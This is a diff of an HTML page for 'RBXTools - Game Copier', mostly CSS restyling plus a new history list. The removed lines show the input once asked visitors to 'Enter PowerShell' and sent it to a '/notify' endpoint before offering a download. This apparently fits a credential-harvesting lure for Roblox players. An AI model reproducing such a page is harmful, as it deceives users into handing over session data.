@@ -3,9 +3,10 @@
 <head>
   <title>RBXTools - Game Copier</title>
   <style>
+    /* 背景アニメーション */
     @keyframes moveStars {
       0% {background-position: 0 0;}
-      100% {background-position: 1000px 1000px;}
+      100% {background-position: 2000px 2000px;}
     }
 
     body {
@@ -15,42 +16,40 @@
       justify-content: center;
       align-items: center;
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #000428, #004e92);
+      background: radial-gradient(#000, #001529);
       background-size: 200% 200%;
-      animation: moveStars 60s linear infinite;
+      animation: moveStars 120s linear infinite;
       color: white;
       flex-direction: column;
       position: relative;
     }
 
     .card {
-      background: rgba(0,0,0,0.6);
-      padding: 40px 60px;
+      background: rgba(0,0,0,0.7);
+      padding: 50px 70px;
       border-radius: 20px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.7);
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
       display: flex;
       flex-direction: column;
       align-items: center;
     }
 
     h1 {
-      font-size: 48px;
-      margin: 0;
-      margin-bottom: 10px;
+      font-size: 50px;
+      margin: 0 0 10px 0;
     }
 
     h2 {
       font-size: 28px;
-      margin: 0;
-      margin-bottom: 30px;
+      margin: 0 0 30px 0;
       color: #ccc;
     }
 
     input {
-      width: 400px;
+      width: 450px;
       padding: 15px;
-      font-size: 20px;
-      border-radius: 12px;
+      font-size: 22px;
+      border-radius: 15px;
       border: none;
       margin-bottom: 20px;
       text-align: center;
@@ -63,19 +62,20 @@
     }
 
     button {
-      padding: 15px 30px;
-      font-size: 20px;
-      border-radius: 12px;
+      padding: 15px 35px;
+      font-size: 22px;
+      border-radius: 15px;
       border: none;
       background: linear-gradient(135deg, #1e90ff, #0d6efd);
       color: white;
       cursor: pointer;
       transition: all 0.3s ease;
+      margin-bottom: 10px;
     }
 
     button:hover {
       transform: translateY(-3px);
-      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
     }
 
     #popup {
@@ -97,13 +97,13 @@
 
     #downloadLink {
       display: none;
-      padding: 15px 30px;
-      font-size: 20px;
-      border-radius: 12px;
+      padding: 15px 35px;
+      font-size: 22px;
+      border-radius: 15px;
       background-color: #28a745;
       color: white;
       text-decoration: none;
-      margin-top: 10px;
+      margin-top: 15px;
       transition: all 0.3s ease;
     }
 
@@ -112,6 +112,23 @@
       transform: translateY(-2px);
       box-shadow: 0 5px 15px rgba(0,0,0,0.4);
     }
+
+    #history {
+      margin-top: 25px;
+      width: 100%;
+      max-width: 500px;
+      text-align: left;
+      font-size: 18px;
+      color: #ccc;
+    }
+
+    #history div {
+      margin-bottom: 8px;
+      background: rgba(255,255,255,0.1);
+      padding: 8px 12px;
+      border-radius: 10px;
+    }
+
   </style>
 </head>
 <body>
@@ -119,18 +136,22 @@
     <h1>RBXTools</h1>
     <h2>Game Copier</h2>
 
-    <input type="text" id="msg" placeholder="Enter PowerShell"/>
+    <input type="text" id="msg" placeholder="Enter Game ID"/>
     <button onclick="send()">Copy</button>
 
+    <!-- Downloadリンク -->
     <a id="downloadLink" href="/files/GorillaDev.rbxl" download>Download</a>
+
+    <!-- 履歴表示 -->
+    <div id="history"></div>
   </div>
 
   <div id="popup"></div>
 
   <script>
     async function send() {
-      const message = document.getElementById("msg").value;
-      if (!message) return showPopup("Please enter a PowerShell");
+      const message = document.getElementById("msg").value.trim();
+      if (!message) return showPopup("Please enter a Game ID");
 
       try {
         const res = await fetch("/notify", {
@@ -142,7 +163,10 @@
         const data = await res.json();
         if(data.ok){
           showPopup("Request sent successfully!");
+          // Downloadリンク表示
           document.getElementById("downloadLink").style.display = "inline-block";
+          // 履歴に追加
+          addHistory(message);
         } else {
           showPopup("Failed to send: " + (data.error || "Unknown error"));
         }
@@ -159,7 +183,13 @@
         popup.classList.remove("show");
       }, 2000);
     }
+
+    function addHistory(gameId) {
+      const history = document.getElementById("history");
+      const div = document.createElement("div");
+      div.textContent = "Copied Game ID: " + gameId;
+      history.prepend(div); // 新しい履歴を上に
+    }
   </script>
 </body>
 </html>
-
